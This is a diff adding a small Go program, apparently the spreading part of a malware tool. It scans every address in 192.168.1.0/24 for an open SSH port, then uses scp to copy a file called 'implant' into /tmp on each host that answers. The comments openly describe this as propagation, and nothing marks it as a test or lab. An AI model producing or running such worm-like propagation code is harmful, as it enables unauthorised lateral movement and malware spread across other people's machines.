@@ -1,0 +1,38 @@
+package main
+
+import (
+    "fmt"
+    "net"
+    "os"
+    "os/exec"
+    "time"
+)
+
+// Function to scan network for open ports
+func scanNetwork() []string {
+    targets := []string{}
+    for i := 1; i <= 255; i++ {
+        ip := fmt.Sprintf("192.168.1.%d", i)
+        conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:22", ip), 2*time.Second)
+        if err == nil {
+            targets = append(targets, ip)
+            conn.Close()
+        }
+    }
+    return targets
+}
+
+// Propagate by copying the implant to target
+func propagate(target string) {
+    _, err := exec.Command("scp", "implant", fmt.Sprintf("user@%s:/tmp/implant", target)).Output()
+    if err != nil {
+        fmt.Printf("Failed to propagate to %s: %v\n", target, err)
+    }
+}
+
+func main() {
+    targets := scanNetwork()
+    for _, target := range targets {
+        propagate(target)
+    }
+}
